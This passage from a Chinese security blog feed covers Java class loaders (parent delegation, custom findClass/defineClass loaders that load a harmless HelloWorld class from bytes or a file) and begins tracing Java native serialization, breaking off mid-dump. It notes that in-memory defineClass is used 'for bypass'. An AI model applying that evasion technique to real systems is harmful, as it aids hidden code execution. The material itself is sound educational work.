<img src="1579508579303-9a8d00d7-3a6e-435c-8fb4-c1e822b209ff.png#align=left&amp;display=inline&amp;height=233&amp;name=image.png&amp;originHeight=466&amp;originWidth=1892&amp;size=121667&amp;status=done&amp;style=none&amp;width=946" alt="image.png"></p>
<p>URLClassLoader继承自ClassLoader。<br>
<img src="1579508772615-6b36f925-920f-4dda-8fe9-a06f0d192f4a.png#align=left&amp;display=inline&amp;height=408&amp;name=image.png&amp;originHeight=550&amp;originWidth=1006&amp;size=34288&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>而一般自定义加载器是直接继承ClassLoader并根据需求重写findClass或者loadClass方法（之后会提到）。<br>
<img src="1579508811045-b00cfcaf-142a-4b08-8dd2-5d8464940f41.png#align=left&amp;display=inline&amp;height=133&amp;name=image.png&amp;originHeight=266&amp;originWidth=1590&amp;size=46469&amp;status=done&amp;style=none&amp;width=795" alt="image.png"></p>
<p>在java代码我们可以调用getParent的方法获取该加载器的父加载器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">appClassloader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extensionClassloader</span> <span class="operator">=</span> appClassloader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;AppClassLoader is &quot;</span> + appClassloader);</span><br><span class="line">        System.out.println(<span class="string">&quot;The parent of AppClassLoader is &quot;</span> + extensionClassloader);</span><br><span class="line">        System.out.println(<span class="string">&quot;The parent of ExtensionClassLoader is &quot;</span> + extensionClassloader.getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console ouput:</span></span><br><span class="line"><span class="comment">////AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2</span></span><br><span class="line"><span class="comment">////The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@61bbe9ba</span></span><br><span class="line"><span class="comment">////The parent of ExtensionClassLoader is null</span></span><br></pre></td></tr></table></figure>
<p><em>ps: 因为BootstrapClassLoader是内嵌到jvm中c代码，开发者无法直接获取，因此ExtensionClassLoader.getParent()会返回null。</em><br>
_<br>
demo代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在new 的位置强制进入，可以看到是从确实是从子加载器AppClassLoader开始的。<br>
<img src="1579509643539-5239956c-aae6-4711-9528-d408fdb9fcc5.png#align=left&amp;display=inline&amp;height=287&amp;name=image.png&amp;originHeight=574&amp;originWidth=2848&amp;size=159070&amp;status=done&amp;style=none&amp;width=1424" alt="image.png"></p>
<p>步入两步后在第一个红框可以看到加载双亲委派的逻辑。<br>
<img src="1579510144691-d9aa11c7-f072-467e-bf3a-9ae5c9dfd21a.png#align=left&amp;display=inline&amp;height=734&amp;name=image.png&amp;originHeight=1468&amp;originWidth=2200&amp;size=358925&amp;status=done&amp;style=none&amp;width=1100" alt="image.png"></p>
<p>如果父类无法加载，那么使用自己的findClass实现来找。这里Test是我自定义的因此不在<code>JAVA_HOME/lib/rt.jar</code><br>
也不在 <code>JAVA_HOME/lib/ext/*.jar</code>中，所以最后会使用AppClassLoader的findClass实现，而AppClassLoader没有实现自己的findClass，所以最后是由URLClassLoader findClass寻找类。最后通过deineClass把字节码转换为类对象。<br>
<img src="1579659421047-d0c30290-aee4-4347-b9e0-66df1d527dca.png#align=left&amp;display=inline&amp;height=501&amp;name=image.png&amp;originHeight=1002&amp;originWidth=2446&amp;size=306425&amp;status=done&amp;style=none&amp;width=1223" alt="image.png"></p>
<h2 id="重写ClassLoader">重写ClassLoader</h2>
<p>通过上面分析我们可以看到在第一次加载类时是在loadClass进行loader调度（实现双亲委派逻辑），最后由findClass拿到路径Resource，由defineClass加载类。<strong>因此，如果我们把自己的class放在不常规的位置，就需要自定义ClassLoader，重写findClass方法。如果我们想突破双亲委派模型（覆盖系统类）就需要重写loadClass。</strong></p>
<p>而实际应用中处于bypass的需要我们经常使用defineClass一个多态实现来从内存中或者文件中执行命令。看下面代码。</p>
<p>从内存中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;com.anbai.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反射调用hello方法,等价于 String str = t.hello();</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从文件中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String classpath)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.classpath = classpath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">byte</span>[] classDate = getClassBinaryData(name);</span><br><span class="line">            <span class="comment">//System.out.println(Arrays.toString(classDate));</span></span><br><span class="line">            <span class="keyword">if</span> (classDate == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123; <span class="comment">// defineClass方法将字节码转化为类</span></span><br><span class="line">                <span class="keyword">return</span> defineClass(name, classDate, <span class="number">0</span>, classDate.length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125; <span class="comment">// 返回类的字节码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] getClassBinaryData(String className) <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> classpath + File.separatorChar + className.replace(<span class="string">&#x27;.&#x27;</span>, File.separatorChar) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            in = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">            out = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = in.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (FileNotFoundException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span></span><br><span class="line">        &#123;</span><br><span class="line">            in.close();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网</a><br>
<a href="https://benjaminwhx.com/2018/08/26/Idea%E4%B8%AD%E9%82%A3%E4%BA%9B%E9%B2%9C%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/">Idea中那些鲜为人知的调试技巧</a><br>
<a href="https://cloud.tencent.com/developer/article/1149445">Java虚拟机–类加载器源码</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java原生序列化与反序列化代码简要分析</title>
    <url>/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- 写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答如下的几个问题。 -->
<!-- more -->
<h2 id="前言">前言</h2>
<p>写这篇文章目的主要在于进一步理解何为java原生反序列化，并且回答的几个问题。</p>
<ol>
<li>为什么就java反序列化使用而言是反序列化类的readObject开始？</li>
<li>为什么resolveClass方法可以防御反序列化？</li>
<li>为什么在反序列化数据后面插入脏数据会不会影响反序列化？</li>
</ol>
<p><strong>ps: 碍于水平有限只会在代码表层做宏观和中观的分析，并不会深入特别底层。</strong></p>
<h2 id="测试代码">测试代码</h2>
<p>序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">firstname</span> <span class="operator">=</span> <span class="string">&quot;cl0und&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">lastname</span> <span class="operator">=</span> <span class="string">&quot;lisan&quot;</span>;</span><br><span class="line"></span><br><span class="line">    User()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参数构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oops</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./serializable.txt&quot;</span>));</span><br><span class="line">        oops.writeObject(<span class="keyword">new</span> <span class="title class_">User</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./serializable.txt&quot;</span>));</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) oips.readObject();</span><br><span class="line">        System.out.println(user.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="序列化">序列化</h2>
<h3 id="预处理">预处理</h3>
<p>预处理的意义是拿到类的描述符类ObjectStreamClass，后续对类的内省和写入序列化数据都由他完成或调度。<br>
<img src="1579071914321-a1cb1263-2c7b-4c2a-ac9e-ab59b368be6f.png#align=left&amp;display=inline&amp;height=268&amp;name=image.png&amp;originHeight=536&amp;originWidth=2218&amp;size=130937&amp;status=done&amp;style=none&amp;width=1109" alt="image.png"></p>
<p><img src="1579072160993-ddec24eb-7894-4fa4-b0a3-6cc1525d0312.png#align=left&amp;display=inline&amp;height=499&amp;name=image.png&amp;originHeight=998&amp;originWidth=2416&amp;size=312156&amp;status=done&amp;style=none&amp;width=1208" alt="image.png"></p>
<p><img src="1579072322762-373ead16-c408-4a20-b9c8-0e5afeb526a2.png#align=left&amp;display=inline&amp;height=79&amp;name=image.png&amp;originHeight=118&amp;originWidth=1114&amp;size=24543&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h3 id="序列化数据">序列化数据</h3>
<p>可以看到一共有三步，首先是TC_OBJECT，其次是类的元信息，最后是类的具体数据。<br>
<img src="1579072894925-2b64c24f-c27e-4076-9680-ff51ad8934d7.png#align=left&amp;display=inline&amp;height=526&amp;name=image.png&amp;originHeight=1052&amp;originWidth=2218&amp;size=309500&amp;status=done&amp;style=none&amp;width=1109" alt="image.png"></p>
<p>第一步就写个标志头，比较简单我们下面直接从第二步开始看。</p>
<h4 id="writeClassDesc">writeClassDesc</h4>
<p>在序列化对象的数据之前，首先会有一个对象类型的分类判断，这里分成四种类型来处理即null类型（TC_NULL）、handle类型（TC_REFERENCE）、代理类型（TC_PROXYCLASSDESC）、普通类型（TC_CLASSDESC）。我们这里的User是普通的类所以走最后的writeNonProxyDesc。<br>
<img src="1579072952655-5aaa96e0-5fdf-488a-ac94-8528a696d735.png#align=left&amp;display=inline&amp;height=265&amp;name=image.png&amp;originHeight=530&amp;originWidth=2170&amp;size=158579&amp;status=done&amp;style=none&amp;width=1085" alt="image.png"></p>
<p>writeNonProxyDesc会先调用writeClassDescriptor把自己的属性信息写入，然后<strong>递归调用writeClassDesc写入父类元信息</strong>。<br>
<img src="1579073424200-23b27228-c0e6-4226-87ea-39f9a62cd74a.png#align=left&amp;display=inline&amp;height=456&amp;name=image.png&amp;originHeight=912&amp;originWidth=2570&amp;size=266403&amp;status=done&amp;style=none&amp;width=1285" alt="image.png"></p>
<p>细看一下writeClassDescriptor，这里面会调用writeNonProxy。<br>
<img src="1579073626530-720d0886-3e01-4436-93f9-f965c7280d8b.png#align=left&amp;display=inline&amp;height=121&amp;name=image.png&amp;originHeight=198&amp;originWidth=1220&amp;size=40079&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>最后调用writeNonProxy，在for循环里面写入属性信息。<br>
<img src="1579073604762-ebea518b-6e04-4df7-a251-edb41729238d.png#align=left&amp;display=inline&amp;height=612&amp;name=image.png&amp;originHeight=1224&amp;originWidth=1920&amp;size=311877&amp;status=done&amp;style=none&amp;width=960" alt="image.png"></p>
<p>这一段的写入如果最后用dump出来，就是下面这个样子。<br>
<img src="1579073704276-07463dd6-ef7f-4174-b38b-b7d9f8e3c621.png#align=left&amp;display=inline&amp;height=678&amp;name=image.png&amp;originHeight=1224&amp;originWidth=1346&amp;size=143782&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<h4 id="writeSerialData">writeSerialData</h4>
<p>把类属性信息写去之后，接下来就是写类属性对应的具体值了。<img src="1579074696395-fa1ba6b8-6c83-4273-9d87-20620d97374f.png#align=left&amp;display=inline&amp;height=691&amp;name=image.png&amp;originHeight=1382&amp;originWidth=2290&amp;size=431384&amp;status=done&amp;style=none&amp;width=1145" alt="image.png"></p>
<p><img src="1579075103594-84570cfe-d6c5-477a-aa31-8be9626ab9cd.png#align=left&amp;display=inline&amp;height=734&amp;name=image.png&amp;originHeight=1468&amp;originWidth=2392&amp;size=472323&amp;status=done&amp;style=none&amp;width=1196" alt="image.png"></p>
<p><em>ps:非原生数据类型指的是字符串、数组、枚举类型、对象。</em><br>
_<br>
一个完整的dump如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 4 - 0x00 04</span><br><span class="line">        Value - User - 0x55736572</span><br><span class="line">      serialVersionUID - 0xbb 67 4f fb 9b a9 d6 bb</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 4 - 0x00 04</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 5 - 0x00 05</span><br><span class="line">            Value - money - 0x6d6f6e6579</span><br><span class="line">        